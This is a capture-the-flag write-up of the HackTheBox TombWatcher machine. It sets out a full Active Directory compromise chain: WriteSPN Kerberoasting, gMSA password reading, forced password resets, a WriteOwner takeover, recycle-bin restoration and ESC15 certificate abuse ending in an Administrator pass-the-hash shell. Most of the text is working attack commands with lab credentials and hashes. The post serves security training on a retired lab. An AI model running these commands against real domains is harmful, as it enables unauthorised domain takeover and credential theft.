
---
title: "HTB TombWatcher — WriteSPN, gMSA Abuse, AD Recycle Bin & ESC15 to Domain Admin"
date: 2026-07-07
categories: [HackTheBox, Active Directory]
tags: [htb, active-directory, kerberoasting, gmsa, writespn, writeowner, adcs, esc15, cve-2024-49019, ad-recycle-bin, certipy, bloodhound, windows]
classes: wide
header:
  image: /assets/images/TOMB/tomb.png
  teaser: /assets/images/TOMB/tomb.png
---

<style>
p { text-align: justify; }
</style>

# HTB TombWatcher

**Difficulty:** Medium  
**OS:** Windows Server 2019  
**Platform:** HackTheBox  
**Category:** Active Directory  
**Status:** Retired

---

## Overview

TombWatcher chains together multiple AD permission abuses in a clean escalation path. Starting from henry with WriteSPN over alfred, the chain runs through targeted Kerberoasting, gMSA abuse, ForceChangePassword, WriteOwner, and GenericAll before landing a WinRM shell. Privilege escalation goes through a deleted account restored from the AD Recycle Bin, an ESC15 vulnerable certificate template, and an Enrollment Agent certificate that signs for Administrator. Long chain, every step logical.

---

## Reconnaissance

### Nmap

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.232.167 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.232.167
```

```
PORT     STATE SERVICE
53/tcp   open  dns
88/tcp   open  kerberos-sec
389/tcp  open  ldap
445/tcp  open  microsoft-ds
5985/tcp open  winrm
```

Domain: `tombwatcher.htb` | DC: `DC01.tombwatcher.htb` | SMB signing enforced.

```bash
echo "10.129.232.167 dc01.tombwatcher.htb tombwatcher.htb" | sudo tee -a /etc/hosts
```

**Starting credentials:** `henry:H3nry_987TGV!`

---

### BloodHound

```bash
bloodhound-python -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb \
  -dc dc01.tombwatcher.htb -ns 10.129.232.167 -c all
```

Full attack path mapped:

```
henry  -> WriteSPN over alfred
alfred -> AddSelf to INFRASTRUCTURE group
INFRASTRUCTURE -> ReadGMSAPassword over ansible_dev$
ansible_dev$ -> ForceChangePassword over sam
sam -> WriteOwner over john
john -> GenericAll over ADCS OU
john -> member of Remote Management Users
```

---

## Foothold — Targeted Kerberoasting via WriteSPN

### Adding an SPN to Alfred

Henry has WriteSPN over alfred. Add an SPN to make alfred kerberoastable:
![WriteSPN](/assets/images/TOMB/writespn.png)
```bash
python3 /opt/krbrelayx/addspn.py \
  -u 'tombwatcher.htb\henry' -p 'H3nry_987TGV!' \
  -t 'alfred' -s 'HTTP/alfred.tombwatcher.htb' 10.129.232.167
```

### Getting the TGS

```bash
ft dc01.tombwatcher.htb impacket-getTGT \
  'tombwatcher.htb/henry:H3nry_987TGV!' -dc-ip 10.129.232.167

export KRB5CCNAME=henry.ccache

ft dc01.tombwatcher.htb impacket-GetUserSPNs \
  tombwatcher.htb/henry -k -no-pass \
  -dc-ip 10.129.232.167 -request
```
![CRACKED](/assets/images/TOMB/kerberoast.png)

### Cracking the Hash

```bash
hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt
```
![YKB](/assets/images/TOMB/basketball.png)

Cracked: `alfred:basketball`

---

## Lateral Movement — gMSA Abuse

### Alfred Adds Himself to INFRASTRUCTURE

![GMSA](/assets/images/TOMB/gmsa.png)

```bash
bloodyAD --host 10.129.232.167 -d tombwatcher.htb \
  -u alfred -p 'basketball' add groupMember Infrastructure alfred
```

### Reading ansible_dev$ gMSA Password

```bash
ft dc01.tombwatcher.htb nxc ldap 10.129.232.167 \
  -u alfred -p 'basketball' -k --gmsa
```
![HASH](/assets/images/TOMB/hash.png)

```
ansible_dev$ NTLM: b91f529d36292ba764273e5dd7b90fa1
```

---

## Lateral Movement — Sam

![Password](/assets/images/TOMB/changep.png)

ForceChangePassword over sam:

```bash
bloodyAD --host 10.129.232.167 -d tombwatcher.htb \
  -u 'ansible_dev$' -p ':b91f529d36292ba764273e5dd7b90fa1' \
  set password sam 'Dontoliver1'
```

---

## Lateral Movement — John
![WriteOwner](/assets/images/TOMB/writeowner.png)

Sam has WriteOwner over john. Take ownership, grant GenericAll, reset password:

```bash
bloodyAD --host 10.129.232.167 -d tombwatcher.htb \
  -u sam -p 'Dontoliver1' set owner john sam

bloodyAD --host 10.129.232.167 -d tombwatcher.htb \
  -u sam -p 'Dontoliver1' add genericAll john sam

bloodyAD --host 10.129.232.167 -d tombwatcher.htb \
  -u sam -p 'Dontoliver1' set password john 'Kdot+Drake'
```

---

## User Flag

![WInrm](/assets/images/TOMB/winrm.png)

John is in Remote Management Users:

```bash
evil-winrm -i 10.129.232.167 -u john -p 'Kdot+Drake'
```

```powershell
type C:\Users\john\Desktop\user.txt
[REDACTED]
```

**User flag captured.** ✅

---

## Privilege Escalation — ADCS ESC15 (CVE-2024-49019)

### Enumerating ADCS

![GenericAll](/assets/images/TOMB/generic.png)

John has GenericAll over the ADCS OU. Certipy finds the WebServer template:

```bash
certipy-ad find -u 'john@tombwatcher.htb' -p 'Kdot+Drake' \
  -dc-ip 10.129.232.167 -stdout
```

Key finding: the WebServer template is Schema Version 1 with an unresolved SID (`S-1-5-21-...-1111`) in enrollment rights. Unresolved SID means a deleted account that still holds rights. That is an AD Recycle Bin target.

---

### Restoring cert_admin from AD Recycle Bin

![Cert](/assets/images/TOMB/cert_admin.png)

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' \
  -IncludeDeletedObjects -Properties cn,objectSid,isDeleted \
  | Where-Object { $_.isDeleted -eq $true }

Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
```

### Propagating FullControl from the ADCS OU

John has GenericAll over the ADCS OU. Push that down to cert_admin:

```bash
impacket-dacledit -action 'write' -rights 'FullControl' \
  -inheritance -principal 'john' \
  -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' \
  tombwatcher.htb/john:'Kdot+Drake'
```

### Resetting cert_admin Password

```bash
bloodyAD --host 10.129.232.167 -d tombwatcher.htb \
  -u john -p 'Kdot+Drake' set password cert_admin 'jackharlow'
```

---

### What ESC15 Actually Is

ESC15 targets Schema Version 1 certificate templates where the enrollee supplies the subject. Schema v1 templates don't enforce Application Policy constraints during issuance. This means an attacker can inject the Certificate Request Agent OID (`1.3.6.1.4.1.311.20.2.1`) into the certificate request, turning a Server Authentication certificate into an Enrollment Agent certificate that can request certificates on behalf of any user in the domain — including Administrator.

---

### Step 1 — Request Enrollment Agent Certificate

```bash
certipy-ad req -ca 'tombwatcher-CA-1' \
  -u 'cert_admin@tombwatcher.htb' -p 'jackharlow' \
  -dc-ip 10.129.232.167 \
  -template WebServer \
  -application-policies '1.3.6.1.4.1.311.20.2.1' \
  -target-ip 10.129.232.167
```

Output: `cert_admin.pfx` — Enrollment Agent certificate.

### Step 2 — Request Certificate on Behalf of Administrator

```bash
certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'jackharlow' \
  -dc-ip 10.129.232.167 \
  -target-ip 10.129.232.167 \
  -ca 'tombwatcher-CA-1' \
  -template User \
  -on-behalf-of 'tombwatcher\administrator' \
  -pfx cert_admin.pfx
```

Output: `administrator.pfx`

### Step 3 — Authenticate and Get NTLM Hash

```bash
ft dc01.tombwatcher.htb certipy-ad auth \
  -dc-ip 10.129.232.167 -pfx administrator.pfx
```
![PFX](/assets/images/TOMB/pfx.png)

```
Administrator NTLM: f61db423bebe3328d33af26741afe5fc
```

---

## Root Flag

```bash
evil-winrm -i 10.129.232.167 -u administrator \
  -H 'f61db423bebe3328d33af26741afe5fc'
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
[REDACTED]
```

**Root flag captured. Domain pwned.** ✅

---

## Full Attack Chain

```
henry:H3nry_987TGV! (given)
  |
  WriteSPN over alfred -> add SPN -> Kerberoast
  -> alfred:basketball
     |
     AddSelf to INFRASTRUCTURE group
     -> ReadGMSAPassword -> ansible_dev$ NTLM hash
        |
        ForceChangePassword over sam -> sam:Dontoliver1
           |
           WriteOwner over john -> set owner -> GenericAll -> reset password
           -> john:Kdot+Drake -> WinRM -> USER FLAG
              |
              GenericAll over ADCS OU
              -> unresolved SID on WebServer template
              -> restore cert_admin from AD Recycle Bin
              -> propagate FullControl -> reset cert_admin password
                 |
                 ESC15 (CVE-2024-49019): inject Certificate Request Agent OID
                 -> cert_admin.pfx (Enrollment Agent)
                 -> request cert on behalf of Administrator
                 -> administrator.pfx -> NTLM hash
                 -> evil-winrm -> ROOT FLAG
```

BTW WHERE YOU SEE ME US "ft", is a little bash script for faketime i use. Rather than always having to check and update the time. So here you go(^_^)/~ :
```
#!/bin/sh
DC="${1}"
shift
if [ -z "$DC" ]; then
    echo "[!] Usage: ft <DC_HOSTNAME> <command>"
    echo "    Example: ft dc01.domain.htb nxc smb <IP> -u user -p pass"
    exit 1
fi
TS="$(ntpdate -q "$DC" | awk '{print $1, $2; exit}')"
if [ -z "$TS" ]; then
    echo "[!] Failed to fetch DC time"
    exit 1
fi
echo "[+] Using DC time: $TS"
exec faketime "$TS" "$@"
```

## What Did We Learn?

**1. WriteSPN is a Kerberoasting primitive**  
Any write to the `servicePrincipalName` attribute lets you add a fake SPN and Kerberoast the account. It's a quieter path than password spray and doesn't require the account to already be a service account.

**2. gMSA membership groups deserve scrutiny**  
`PrincipalsAllowedToReadPassword` controls who can dump the gMSA hash. In this case, getting alfred into the INFRASTRUCTURE group was enough to read ansible_dev$'s hash. Membership in those groups is as sensitive as the service account itself.

**3. WriteOwner enables full object compromise**  
Changing ownership then granting GenericAll is a two-step full takeover of any AD object. Once you own an object you can give yourself any permission you want.

**4. Unresolved SIDs in certificate template ACLs signal deleted accounts**  
When certipy shows a SID instead of a name in enrollment rights, that account was deleted but its permissions persisted. AD Recycle Bin can bring it back with those rights intact. Always investigate unresolved SIDs.

**5. ESC15 turns any Schema v1 template into an Enrollment Agent path**  
Schema Version 1 templates don't validate Application Policy extensions. Injecting the Certificate Request Agent OID converts a basic Server Authentication certificate into one that can enroll on behalf of any domain user. The fix is upgrading templates to Schema v2 or disabling enrollee-supplied subject on sensitive templates.

**6. GenericAll on an OU propagates down with dacledit**  
GenericAll on the ADCS OU didn't automatically give control over objects inside it until we used dacledit to push the permission down with inheritance. Understanding how OU-level permissions interact with object-level permissions matters for both attack and defence.

---

<img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMzhlbjk5NXY3b3ExdXhqdmUzaDk1M2V0aHhnbzFsNm83NnJuMzhwayZlcD12MV9naWZzX3NlYXJjaCZjdD1n/tcKnSDeltmpKxslv8r/giphy.gif"
     style="width: 100%; height: auto;"
     alt="pwned">

*Written by 0x5h4q | [0x5h4q.github.io](https://0x5h4q.github.io)*
